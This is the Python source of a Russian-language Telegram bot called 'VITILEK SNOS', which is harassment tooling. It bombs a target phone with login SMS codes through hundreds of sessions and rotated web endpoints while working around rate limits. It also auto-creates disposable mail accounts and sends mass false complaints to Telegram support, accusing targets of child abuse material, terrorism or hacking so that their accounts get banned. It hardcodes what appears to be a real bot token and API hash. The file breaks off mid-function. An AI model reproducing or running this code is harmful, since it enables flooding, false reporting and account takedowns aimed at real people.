import asyncio
import logging
import os
import random
import string
import json
import time
import smtplib
import aiohttp
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from typing import Optional

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS = set()

# Настройки почты
SENDERS = {
    'email1@gmail.com': 'password1',
    'email2@mail.ru': 'password2',
    'email3@yandex.ru': 'password3',
    'email4@rambler.ru': 'password4',
    'email5@gmail.com': 'password5'
}

RECEIVERS = [
    'sms@telegram.org',
    'dmca@telegram.org',
    'abuse@telegram.org',
    'sticker@telegram.org',
    'support@telegram.org',
    'security@telegram.org',
    'stopca@telegram.org',
    'ca@telegram.org'
]

# Настройки mail.tm
USE_MAILTM = True
MAILTM_ACCOUNTS_COUNT = 100

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

active_attacks = {}
sessions_pool = []
MAX_SESSIONS = 700


class AttackState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()


class ComplaintState(StatesGroup):
    waiting_type = State()
    waiting_target = State()
    waiting_username = State()
    waiting_id = State()
    waiting_links = State()


class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery):
            user_id = event.from_user.id
        elif isinstance(event, types.Message):
            user_id = event.from_user.id

        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'):
            return await handler(event, data)

        if user_id and user_id != ADMIN_ID and user_id not in ALLOWED_USERS:
            if isinstance(event, types.CallbackQuery):
                await event.answer("У вас нет прав!", show_alert=True)
            elif isinstance(event, types.Message):
                await event.reply("У вас нет прав!")
            return

        return await handler(event, data)


dp.update.middleware(AccessMiddleware())

# ---------- USER-AGENTS ----------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) TelegramDesktop/4.11.8 Chrome/114.0.5735.199 Safari/537.36',
]


# ---------- КЛАСС MAIL.TM ----------
class MailTM:
    def __init__(self):
        self.base_url = "https://api.mail.tm"
        self.accounts = []
        self.session = None

    async def init_session(self):
        if not self.session:
            connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)

    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None

    async def get_domain(self) -> str:
        await self.init_session()
        try:
            async with self.session.get(f"{self.base_url}/domains") as resp:
                domains = await resp.json()
                return domains['hydra:member'][0]['domain']
        except:
            return "inbox.testmail.app"

    async def create_account(self) -> dict:
        await self.init_session()

        try:
            random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
            domain = await self.get_domain()

            account_data = {
                "address": f"vitilek_{random_str}@{domain}",
                "password": ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=16))
            }

            async with self.session.post(
                    f"{self.base_url}/accounts",
                    json=account_data,
                    headers={"Content-Type": "application/json"}
            ) as resp:
                if resp.status in [200, 201]:
                    account_info = await resp.json()

                    login_data = {
                        "address": account_data["address"],
                        "password": account_data["password"]
                    }

                    async with self.session.post(
                            f"{self.base_url}/token",
                            json=login_data,
                            headers={"Content-Type": "application/json"}
                    ) as login_resp:
                        if login_resp.status == 200:
                            token_data = await login_resp.json()

                            return {
                                "email": account_data["address"],
                                "password": account_data["password"],
                                "token": token_data["token"],
                                "id": account_info["id"],
                                "created_at": datetime.now().isoformat()
                            }
        except Exception as e:
            logger.error(f"Ошибка создания mail.tm аккаунта: {e}")

        return None

    async def check_account_valid(self, account: dict) -> bool:
        """Проверяет валидность аккаунта"""
        await self.init_session()

        try:
            headers = {
                "Authorization": f"Bearer {account['token']}",
                "Content-Type": "application/json"
            }

            async with self.session.get(
                    f"{self.base_url}/me",
                    headers=headers
            ) as resp:
                return resp.status == 200
        except:
            return False

    async def create_multiple_accounts(self, count: int) -> list:
        """Создает точно указанное количество временных аккаунтов"""
        accounts = []
        max_attempts = count * 3  # Максимум 3 попытки на каждый аккаунт
        attempts = 0

        logger.info(f"Начинаю создание {count} mail.tm аккаунтов...")

        while len(accounts) < count and attempts < max_attempts:
            try:
                account = await self.create_account()
                if account:
                    accounts.append(account)
                    logger.info(f"Создан mail.tm аккаунт {len(accounts)}/{count}: {account['email']}")

                    # Сохраняем прогресс после каждого аккаунта
                    with open('mailtm_accounts.json', 'w') as f:
                        json.dump(accounts, f, indent=2)
                else:
                    attempts += 1
                    logger.warning(f"Не удалось создать аккаунт, попытка {attempts}")

            except Exception as e:
                attempts += 1
                logger.error(f"Ошибка создания аккаунта: {e}")

            # Задержка между попытками
            if len(accounts) < count:
                await asyncio.sleep(2)  # 2 секунды между созданиями

        if len(accounts) < count:
            logger.warning(f"Создано только {len(accounts)} из {count} аккаунтов")
        else:
            logger.info(f"Успешно создано {len(accounts)} mail.tm аккаунтов")

        self.accounts = accounts
        return accounts


# ---------- ИНИЦИАЛИЗАЦИЯ СЕССИЙ ----------
async def init_sessions():
    global sessions_pool

    logger.info(f"Инициализация {MAX_SESSIONS} сессий...")

    for i in range(MAX_SESSIONS):
        session_file = f"sessions/pool_session_{i}"
        os.makedirs("sessions", exist_ok=True)
        try:
            client = Client(
                session_file,
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=False,
                no_updates=True
            )
            await client.connect()
            sessions_pool.append({
                "client": client,
                "file": session_file,
                "in_use": False,
                "flood_until": 0
            })
            if (i + 1) % 100 == 0:
                logger.info(f"Инициализировано {i + 1}/{MAX_SESSIONS} сессий")
        except Exception as e:
            logger.error(f"Ошибка инициализации сессии {i}: {e}")


async def get_available_sessions(count: int) -> list:
    available = []
    current_time = time.time()

    for session in sessions_pool:
        if not session["in_use"] and session["flood_until"] < current_time:
            session["in_use"] = True
            available.append(session)
            if len(available) >= count:
                break

    return available


def release_sessions(sessions: list):
    for session in sessions:
        session["in_use"] = False


async def send_sms_multisession(phone: str, session) -> dict:
    client = session["client"]
    session_idx = sessions_pool.index(session)

    try:
        if not client.is_connected:
            await client.connect()

        sent = await client.send_code(phone)

        return {
            "session": session_idx,
            "success": True,
            "time": datetime.now().strftime("%H:%M:%S")
        }

    except FloodWait as e:
        session["flood_until"] = time.time() + e.value
        return {
            "session": session_idx,
            "success": False,
            "flood_wait": e.value,
            "time": datetime.now().strftime("%H:%M:%S")
        }
    except Exception as e:
        return {
            "session": session_idx,
            "success": False,
            "error": str(e)[:50],
            "time": datetime.now().strftime("%H:%M:%S")
        }


async def send_request(session: aiohttp.ClientSession, phone: str) -> dict:
    endpoints = [
        "https://oauth.telegram.org/auth/request",
        "https://my.telegram.org/auth/send_password",
        "https://web.telegram.org/k/api/auth/sendCode",
        "https://passport.telegram.org/api/auth/sendCode",
        "https://fragment.com/api/auth/sendCode",
        "https://wallet.telegram.org/api/auth/sendCode",
    ]

    endpoint = random.choice(endpoints)

    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'ru-RU,ru;q=0.9',
        'Content-Type': 'application/json',
        'Origin': endpoint.split('/')[2],
        'Referer': f"https://{endpoint.split('/')[2]}/auth",
    }

    payload = {
        'phone': phone,
        'api_id': API_ID,
        'api_hash': API_HASH,
        'settings': {
            '_': 'codeSettings',
            'allow_flashcall': False,
            'current_number': True
        }
    }

    try:
        async with session.post(
                endpoint,
                headers=headers,
                json=payload,
                timeout=aiohttp.ClientTimeout(total=5),
                ssl=False
        ) as response:
            return {
                "endpoint": endpoint.split('/')[2],
                "success": response.status in [200, 201, 202, 400, 401, 403, 429],
                "time": datetime.now().strftime("%H:%M:%S")
            }
    except:
        return {
            "endpoint": endpoint.split('/')[2],
            "success": False,
            "time": datetime.now().strftime("%H:%M:%S")
        }


async def mega_attack_parallel(phone: str, count: int, progress_callback=None) -> tuple:
    results = []
    successful = 0
    failed = 0

    connector = aiohttp.TCPConnector(limit=500, force_close=True, ssl=False)
    timeout = aiohttp.ClientTimeout(total=8)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for round_num in range(1, count + 1):
            tasks = []

            available_sessions = await get_available_sessions(MAX_SESSIONS)

            for _ in range(len(available_sessions) * 2):
                tasks.append(send_request(session, phone))

            for sess in available_sessions:
                tasks.append(send_sms_multisession(phone, sess))

            batch_results = await asyncio.gather(*tasks, return_exceptions=True)

            release_sessions(available_sessions)

            for r in batch_results:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get('success'):
                        successful += 1
                    else:
                        failed += 1

            if progress_callback:
                await progress_callback(round_num, count, successful, failed)

            await asyncio.sleep(random.uniform(5, 10))

    return results, successful, failed


def generate_report(username: str, phone: str, results: list, successful: int, failed: int) -> str:
    lines = []

    lines.append("VITILEK SNOS - ОТЧЕТ ОБ АТАКЕ")
    lines.append("=" * 60)
    lines.append(f"Пользователь: {username}")
    lines.append(f"Номер телефона: {phone}")
    lines.append(f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"Всего запросов: {successful + failed}")
    lines.append(f"Успешно: {successful}")
    lines.append(f"Ошибок: {failed}")
    lines.append("=" * 60)
    lines.append("")
    lines.append("ПОДРОБНЫЙ ЛОГ:")
    lines.append("-" * 60)

    for i, r in enumerate(results, 1):
        time_str = r.get('time', '')
        if 'endpoint' in r:
            site = r.get('endpoint', 'Unknown')
            status = "ОТПРАВЛЕНО" if r.get('success') else "ОШИБКА"
            lines.append(f"[{time_str}] WEB | {site} -> {status}")
        elif 'session' in r:
            session_idx = r.get('session', 0)
            status = "ОТПРАВЛЕНО" if r.get('success') else "ОШИБКА"
            if r.get('flood_wait'):
                lines.append(f"[{time_str}] SMS | Сессия {session_idx} -> FLOOD ({r['flood_wait']}с)")
            else:
                lines.append(f"[{time_str}] SMS | Сессия {session_idx} -> {status}")

    lines.append("-" * 60)
    lines.append("КОНЕЦ ОТЧЕТА")

    return "\n".join(lines)


# ---------- ПОЧТОВАЯ СИСТЕМА ----------
def send_email_sync(sender_email: str, sender_password: str, receiver: str,
                    subject: str, body: str) -> bool:
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain', 'utf-8'))

        if 'gmail.com' in sender_email:
            server = smtplib.SMTP('smtp.gmail.com', 587)
        elif 'mail.ru' in sender_email:
            server = smtplib.SMTP('smtp.mail.ru', 587)
        elif 'yandex.ru' in sender_email:
            server = smtplib.SMTP('smtp.yandex.ru', 587)
        elif 'rambler.ru' in sender_email:
            server = smtplib.SMTP('smtp.rambler.ru', 587)
        else:
            server = smtplib.SMTP('smtp.gmail.com', 587)

        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        return False


async def send_email_async(sender_email: str, sender_password: str, receiver: str,
                           subject: str, body: str, mail_tm: MailTM = None,
                           tm_account: dict = None) -> bool:
    if tm_account and mail_tm:
        return await mail_tm.send_email_from_tm(tm_account, receiver, subject, body)

    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        None, send_email_sync, sender_email, sender_password, receiver, subject, body
    )


async def send_mass_complaint_account_async(username: str, telegram_id: str,
                                            reason: str, complaint_type: str,
                                            mail_tm: MailTM = None) -> int:
    complaint_texts = {
        "1": f"Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_id}. Спасибо за помощь.",
        "2": f"Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм - {username}, а мой айди, если злоумышленник поменял юзернейм - {telegram_id}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных.",
        "3": f"Добрый день поддержка Telegram! Аккаунт {username}, {telegram_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться. Прошу разберитесь с этим. Заранее спасибо!",
        "4": f"Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} ссылает людей на сторонний сервис. Оставив в поле о себе ссылку на другой сервис он ссылает туда людей с вашего мессенджера! Прошу проверить и разобраться! Заранее спасибо",
        "5": f"Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram. Прошу проверить данную жалобу и принять меры!"
    }

    body = complaint_texts.get(complaint_type, complaint_texts["1"])
    sent = 0

    all_senders = []

    for sender_email, password in SENDERS.items():
        all_senders.append({
            "type": "regular",
            "email": sender_email,
            "password": password
        })

    if mail_tm and mail_tm.accounts:
        for tm_acc in mail_tm.accounts:
            all_senders.append({
                "type": "mailtm",
                "account": tm_acc
            })

    tasks = []
    for sender in all_senders:
        for receiver in RECEIVERS:
            if sender["type"] == "regular":
                task = send_email_async(
                    sender["email"],
                    sender["password"],
                    receiver,
                    "Жалоба на Telegram аккаунт",
                    body
                )
            else:
                task = send_email_async(
                    "",
                    "",
                    receiver,
                    "Жалоба на Telegram аккаунт",
                    body,
                    mail_tm=mail_tm,
                    tm_account=sender["account"]
                )
            tasks.append(task)

    semaphore = asyncio.Semaphore(50)

    async def send_with_limit(task):
        async with semaphore:
            result = await task
            await asyncio.sleep(0.5)
            return result

    results = await asyncio.gather(*[send_with_limit(t) for t in tasks])
    sent = sum(1 for r in results if r)

    return sent


async def send_mass_complaint_channel_async(channel_link: str, violation_link: str,
                                            complaint_type: str, mail_tm: MailTM = None) -> int:
    complaint_texts = {
        "8": [
            f"Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются личные данные невинных людей. Ссылка на канал - {channel_link} . Ссылка на нарушение - {violation_link} . Просьба удалить данный канал с вашей площадки",
            f"Hello, Telegram support team! I have found a channel on your social network where personal data of innocent people is being published. The link to the channel is {channel_link}. The link to the violation is {violation_link}. Please remove this channel from your platform"
        ],
        "9": [
            f"Здравствуйте, уважаемый модератор телеграмм, хочу пожаловаться вам на канал, который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал: {channel_link} Ссылка на нарушение: {violation_link} Просьба заблокировать данный канал.",
            f"Hello, dear Telegram moderator, I would like to file a complaint regarding a channel on your platform that is selling doxxing and swatting services. Telegram channel link: {channel_link} Violation link: {violation_link} Please block this channel."
        ],
        "10": [
            f"Здравствуйте, уважаемая поддержка Telegram! Пожалуйста, заблокируйте канал {channel_link}. В этом канале угрожают расстрелом детей в школах и совершением террористических актов, вы можете увидеть это здесь {violation_link}. Заранее спасибо.",
            f"Hello dear Telegram support! Please block the {channel_link} channel. The channel threatens to shoot children in schools and commit terrorist attacks, you can see it here {violation_link}. Thank you in advance"
        ],
        "11": [
            f"Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуется порнография с несовершеннолетними детьми. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
            f"Hello, Telegram support! In your social network, I found a channel posting pornography videos with children. Channel link - {channel_link} violation link - {violation_link}, please block this channel"
        ],
        "12": [
            f"Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются посты с целью обмана и мошенничества. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
            f"Hello, Telegram support! In your social network, I found a channel where posts aimed at deception and fraud are being published. The link to the channel is {channel_link}. The link to the violation is {violation_link}. Please remove this channel from your platform."
        ],
        "13": [
            f"Здравствуйте, поддержка telegram. Я бы хотел пожаловаться на телеграм канал продающий виртуальные номера, насколько я знаю это запрещено правилами вашей площадки. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link}. Спасибо что очищаете свою площадку от подобных каналов!",
            f"Hello, Telegram support. I would like to report a Telegram channel selling virtual phone numbers. Channel link: {channel_link} Violation link: {violation_link}. Thank you for cleansing your platform from such channels!"
        ],
        "14": [
            f"Доброго времени суток, уважаемая поддержка. На просторах вашей платформы мне попался канал, распространяющий шок контент с убийствами людей. Ссылка на канал - {channel_link}, ссылка на нарушение - {violation_link}. Просьба удалить данный канал, спасибо за внимание.",
            f"Good day, esteemed support team. I came across a channel on your platform that disseminates shocking content involving human fatalities. Channel link - {channel_link}, violation link - {violation_link}. Kindly remove this channel. Thank you."
        ],
        "15": [
            f"Здравствуйте, уважаемая поддержка! Прошу проверить и заблокировать канал - {channel_link}, где размещаются сцены насилия и убийства животных. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки.",
            f"Hello, respected support team! Please check and block the channel - {channel_link}, where scenes of violence and killing of animals are posted. Violation link - {violation_link}. Kindly remove this channel from your platform."
        ]
    }

    texts = complaint_texts.get(complaint_type, complaint_texts["12"])
    sent = 0

    all_senders = []

    for sender_email, password in SENDERS.items():
        all_senders.append({
            "type": "regular",
            "email": sender_email,
            "password": password
        })

    if mail_tm and mail_tm.accounts:
        for tm_acc in mail_tm.accounts:
            all_senders.append({
                "type": "mailtm",
                "account": tm_acc
            })

    tasks = []
    for sender in all_senders:
        selected_receivers = random.sample(RECEIVERS, min(3, len(RECEIVERS)))

        for receiver in selected_receivers:
            if sender["type"] == "regular":
                task = send_email_async(
                    sender["email"],
                    sender["password"],
                    receiver,
                    "Жалоба на канал в Telegram",
                    texts[0]
                )
            else:
                task = send_email_async(
                    "",
                    "",
                    receiver,
                    "Жалоба на канал в Telegram",
                    texts[0],
                    mail_tm=mail_tm,
                    tm_account=sender["account"]
                )
            tasks.append(task)

            if len(texts) > 1:
                await asyncio.sleep(0.1)
                if sender["type"] == "regular":
                    task_en = send_email_async(
                        sender["email"],
                        sender["password"],
                        receiver,
                        "Complaint about a channel in Telegram",
                        texts[1]
                    )
                else:
                    task_en = send_email_async(
                        "",
                        "",
                        receiver,
                        "Complaint about a channel in Telegram",
                        texts[1],
                        mail_tm=mail_tm,
                        tm_account=sender["account"]
                    )
                tasks.append(task_en)

    semaphore = asyncio.Semaphore(50)

    async def send_with_limit(task):
        async with semaphore:
            result = await task
            await asyncio.sleep(0.5)
            return result

    results = await asyncio.gather(*[send_with_limit(t) for t in tasks])
    sent = sum(1 for r in results if r)

    return sent


# ---------- UI НА РУССКОМ ----------
def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="СНОС НОМЕРА", callback_data="snos_attack")
    builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="complaint_account")
    builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="complaint_channel")
    builder.button(text="СТАТУС MAIL.TM", callback_data="mailtm_status")
    builder.button(text="ОСТАНОВИТЬ АТАКУ", callback_data="stop_attack")
    builder.adjust(1)
    return builder.as_markup()


def get_account_complaint_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="Обычная жалоба", callback_data="acc_1")
    builder.button(text="Снос сессий", callback_data="acc_2")
    builder.button(text="Виртуальный номер", callback_data="acc_3")
    builder.button(text="Ссылка в био", callback_data="acc_4")
    builder.button(text="Спам с премиумом", callback_data="acc_5")
    builder.button(text="Назад", callback_data="main_menu")
    builder.adjust(2, 2, 1, 1)
    return builder.as_markup()


def get_channel_complaint_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="Личные данные", callback_data="ch_8")
    builder.button(text="Доксинг/Сваттинг", callback_data="ch_9")
    builder.button(text="Терроризм/Скулшутинг", callback_data="ch_10")
    builder.button(text="Детская порнография", callback_data="ch_11")
    builder.button(text="Мошенничество", callback_data="ch_12")
    builder.button(text="Продажа вирт номеров", callback_data="ch_13")
    builder.button(text="Расчлененка/Убийства", callback_data="ch_14")
    builder.button(text="Живодерство", callback_data="ch_15")
    builder.button(text="Назад", callback_data="main_menu")
    builder.adjust(2, 2, 2, 2, 1)
    return builder.as_markup()


# ---------- ОБРАБОТЧИКИ ----------
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_info = f"{message.from_user.id}"
    if message.from_user.username:
        user_info = f"{message.from_user.id} (@{message.from_user.username})"

    await message.answer(
        f"<b>VITILEK SNOS</b>\n\n"
        f"Пользователь: {user_info}\n"
        f"Статус: Готов\n\n"
        f"Возможности:\n"
        f"- Мультисессионный снос\n"
        f"- {MAX_SESSIONS} параллельных сессий\n"
        f"- Обход FloodWait\n"
        f"- Жалобы на аккаунты/каналы\n"
        f"- До 100 кругов атаки",
        reply_markup=get_main_menu(),
        parse_mode="HTML"
    )


@dp.callback_query(F.data == "main_menu")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("<b>Vitilek Snos - Главное меню</b>", reply_markup=get_main_menu(),
                                     parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data == "snos_attack")
async def snos_start(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id

    if user_id in active_attacks:
        await callback.answer("Атака уже активна!", show_alert=True)
        return

    await state.set_state(AttackState.waiting_phone)
    await callback.message.edit_text(
        "<b>Введите номер телефона:</b>\n\n"
        "Формат: +79001234567",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ]),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.message(StateFilter(AttackState.waiting_phone))
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if not phone.startswith("+"):
        phone = "+" + phone

    await state.update_data(phone=phone)
    await state.set_state(AttackState.waiting_count)

    await message.answer(
        f"Номер: <code>{phone}</code>\n\n"
        f"<b>Количество кругов (1-100):</b>\n\n"
        f"Каждый круг: 1400 веб-запросов + 700 SMS",
        parse_mode="HTML"
    )


@dp.message(StateFilter(AttackState.waiting_count))
async def process_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count < 1 or count > 100:
            await message.answer("Введите число от 1 до 100!")
            return
    except ValueError:
        await message.answer("Введите число!")
        return

    data = await state.get_data()
    phone = data.get("phone")
    username = f"{message.from_user.id}"
    if message.from_user.username:
        username = f"{message.from_user.id} (@{message.from_user.username})"

    await state.clear()
    await start_snos(message, username, phone, count)


async def start_snos(event, username: str, phone: str, count: int):
    user_id = event.chat.id

    status_msg = await event.answer(
        f"<b>VITILEK SNOS - АТАКА ЗАПУЩЕНА</b>\n\n"
        f"Пользователь: {username}\n"
        f"Номер: <code>{phone}</code>\n"
        f"Кругов: {count}\n"
        f"Сессий: {MAX_SESSIONS}\n\n"
        f"Выполнение...",
        parse_mode="HTML"
    )

    async def update_progress(current: int, total: int, successful: int, failed: int):
        try:
            text = f"<b>VITILEK SNOS - АТАКА ИДЕТ</b>\n\n"
            text += f"Номер: <code>{phone}</code>\n"
            text += f"Прогресс: {current}/{total} кругов\n"
            text += f"Успешно: {successful} | Ошибок: {failed}\n"
            text += f"Активных сессий: {MAX_SESSIONS}"

            await status_msg.edit_text(text, parse_mode="HTML")
        except:
            pass

    async def attack_task():
        try:
            results, successful, failed = await mega_attack_parallel(phone, count, update_progress)

            report = generate_report(username, phone, results, successful, failed)

            filename = f"snos_{phone.replace('+', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(report)

            await event.answer_document(
                FSInputFile(filename),
                caption=f"<b>Vitilek Snos - Атака завершена</b>\n\nУспешно: {successful}\nОшибок: {failed}",
                parse_mode="HTML"
            )

            os.remove(filename)

            await status_msg.edit_text(
                f"<b>VITILEK SNOS - ЗАВЕРШЕНО</b>\n\n"
                f"Номер: <code>{phone}</code>\n"
                f"Кругов: {count}\n"
                f"Успешно: {successful}\n"
                f"Ошибок: {failed}",
                reply_markup=get_main_menu(),
                parse_mode="HTML"
            )

        except Exception as e:
            await status_msg.edit_text(
                f"<b>ОШИБКА</b>\n\n{str(e)[:200]}",
                reply_markup=get_main_menu(),
                parse_mode="HTML"
            )
        finally:
            if user_id in active_attacks:
                del active_attacks[user_id]

    task = asyncio.create_task(attack_task())
    active_attacks[user_id] = {"task": task, "phone": phone}


@dp.callback_query(F.data == "force_create_mailtm")
async def force_create_mailtm(callback: types.CallbackQuery):
    await callback.answer("Принудительное создание 100 аккаунтов...")

    status_msg = await callback.message.edit_text(
        "<b>Создание 100 mail.tm аккаунтов...</b>\n"
        "Это может занять несколько минут.",
        parse_mode="HTML"
    )

    # Создаем новые аккаунты
    await mail_tm.close()
    new_accounts = await mail_tm.create_multiple_accounts(100)

    # Сохраняем
    with open('mailtm_accounts.json', 'w') as f:
        json.dump(new_accounts, f, indent=2)

    mail_tm.accounts = new_accounts

    await status_msg.edit_text(
        f"<b>Создано {len(new_accounts)} новых mail.tm аккаунтов</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Показать аккаунты", callback_data="mailtm_status")],
            [InlineKeyboardButton(text="Назад", callback_data="main_menu")]
        ]),
        parse_mode="HTML"
    )


@dp.callback_query(F.data == "mailtm_status")
async def mailtm_status(callback: types.CallbackQuery):
    if not USE_MAILTM:
        await callback.answer("Mail.tm отключен в настройках", show_alert=True)
        return

    if not mail_tm.accounts:
        await callback.answer("Нет активных mail.tm аккаунтов", show_alert=True)
        return

    text = "<b>Статус Mail.tm аккаунтов:</b>\n\n"
    for i, acc in enumerate(mail_tm.accounts[:20], 1):
        text += f"{i}. <code>{acc['email']}</code>\n"

    if len(mail_tm.accounts) > 20:
        text += f"\n... и ещё {len(mail_tm.accounts) - 20}"

    text += f"\n\n<b>Всего аккаунтов:</b> {len(mail_tm.accounts)}"

    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Обновить аккаунты", callback_data="refresh_mailtm")],
            [InlineKeyboardButton(text="Создать 100 новых", callback_data="force_create_mailtm")],
            [InlineKeyboardButton(text="Назад", callback_data="main_menu")]
        ]),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data == "stop_attack")
async def stop_attack(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    if user_id in active_attacks:
        active_attacks[user_id]["task"].cancel()
        del active_attacks[user_id]
        await callback.message.edit_text("<b>Атака остановлена</b>", reply_markup=get_main_menu(), parse_mode="HTML")
        await callback.answer("Остановлено")
    else:
        await callback.answer("Нет активной атаки", show_alert=True)


@dp.callback_query(F.data == "complaint_account")
async def complaint_account_menu(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВыберите тип:",
        reply_markup=get_account_complaint_menu(),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("acc_"))
async def account_complaint_type(callback: types.CallbackQuery, state: FSMContext):
    complaint_type = callback.data.replace("acc_", "")
    await state.update_data(complaint_type=complaint_type, target_type="account")
    await state.set_state(ComplaintState.waiting_username)

    await callback.message.edit_text(
        "<b>Введите юзернейм (без @):</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="complaint_account")]
        ]),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data == "complaint_channel")
async def complaint_channel_menu(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВыберите тип:",
        reply_markup=get_channel_complaint_menu(),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("ch_"))
async def channel_complaint_type(callback: types.CallbackQuery, state: FSMContext):
    complaint_type = callback.data.replace("ch_", "")
